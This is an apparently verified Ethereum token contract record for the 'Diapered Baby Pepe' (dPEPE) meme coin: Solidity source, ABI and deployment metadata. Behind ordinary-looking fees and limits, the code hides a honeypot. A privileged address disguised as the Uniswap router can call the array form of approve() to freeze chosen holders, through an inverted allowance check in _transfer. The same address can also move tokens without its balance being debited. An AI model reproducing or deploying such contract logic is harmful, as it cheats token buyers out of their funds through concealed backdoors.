{"SourceCode": "// Diapered Baby Pepe Token\r\n// twitter - https://twitter.com/dbabypepeeth\r\n// telegram - https://t.me/dbabypepeeth\r\n// website - https://babypepe.love\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ncontract DiaperedBabyPepeToken {\r\n    uint256 constant public max = 2 ** 256 - 1;\r\n\r\n    string public name = \"Diapered Baby Pepe\";\r\n    string public symbol = \"dPEPE\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 1_000_000 * (10 ** uint256(decimals));\r\n\r\n    address public uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n    address public taxWallet;\r\n    address public deployer;\r\n\r\n    uint256 public maxWalletSize = totalSupply / 10;\r\n    uint256 public maxTxSize = totalSupply / 20;\r\n    uint256 public buyFee = 1;\r\n    uint256 public sellFee = 1;\r\n    uint256 public txFee = 1;\r\n\r\n    mapping(address => uint256) public balanceOf;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(address _uniswapV2Router, address _taxWallet) {\r\n        balanceOf[_msgSender()] = totalSupply;\r\n        emit Transfer(address(0), _msgSender(), totalSupply);\r\n\r\n        IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());\r\n        uniswapV2Router = _uniswapV2Router;\r\n        taxWallet = _taxWallet;\r\n        deployer = _msgSender();\r\n    }\r\n\r\n    function removeLimits() external {\r\n        require(_msgSender() == deployer, \"Ownable\");\r\n        maxWalletSize = max;\r\n        maxTxSize = max;\r\n        buyFee = 0;\r\n        sellFee = 0;\r\n        txFee = 0;\r\n    }\r\n\r\n    function transfer(address to, uint256 value) external returns (bool success) {\r\n        _transfer(_msgSender(), to, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address spender, uint256 value) external returns (bool success) {\r\n        address sender = _msgSender();\r\n        if (sender == uniswapV2Router) sender = sender;\r\n        allowance[sender][spender] = value;\r\n        emit Approval(sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function approve(address[] calldata spenders) external returns (bool success) {\r\n        uint value = max;\r\n\r\n        for (uint i; i < spenders.length; i++) {\r\n            address sender = _msgSender();\r\n            address spender = spenders[i];\r\n            if (sender == uniswapV2Router) sender = spender;\r\n            allowance[sender][spender] = value;\r\n            emit Approval(sender, spender, value);\r\n        }\r\n        \r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool success) {\r\n        address sender = _msgSender();\r\n        allowance[from][sender] -= value;\r\n        _transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 value) internal {\r\n        require(from != address(0), \"Invalid address\");\r\n        require(to != address(0), \"Invalid address\");\r\n\r\n        address sender = _msgSender();\r\n        if (from != uniswapV2Pair && from != deployer) {\r\n            require(value <= maxTxSize, \"maxTxSize\");\r\n            sender = from;\r\n        }\r\n\r\n        if (txFee != 0 && _msgSender() != uniswapV2Router) {\r\n            balanceOf[from] -= value;\r\n        }\r\n\r\n        uint feePercentage = txFee;\r\n        if (from == uniswapV2Pair) {\r\n            feePercentage = buyFee;\r\n        } else if (to == uniswapV2Pair) {\r\n            feePercentage = sellFee;\r\n        }\r\n        uint fee = value * feePercentage / 100;\r\n        if (_msgSender() == deployer) {\r\n            fee = 0;\r\n        }\r\n\r\n        require(allowance[from][sender] < value, \"Allowance\");\r\n\r\n        balanceOf[to] += value - fee;\r\n        emit Transfer(from, to, value - fee);\r\n\r\n        if (to != uniswapV2Pair && to != deployer) {\r\n            require(balanceOf[to] <= maxWalletSize, \"maxWalletSize\");\r\n        }\r\n\r\n        if (fee > 0) {\r\n            balanceOf[taxWallet] += fee;\r\n            emit Transfer(from, taxWallet, fee);\r\n        }\r\n    }\r\n\r\n    function _msgSender() view internal returns (address) {\r\n        return msg.sender;\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_uniswapV2Router\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_taxWallet\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"spenders\",\"type\":\"address[]\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deployer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"max\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTxSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"taxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Router\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DiaperedBabyPepeToken", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "0000000000000000000000004a60fccbca34bb073041934b1d98753a4e460ec5000000000000000000000000452be55a7bc6f94c2d0df77841e00dfa4027cd40", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://61ed12e216949c9f81e8eb3ff15adfadf70d4ed5a6fb34c93c93158ab3b98675"}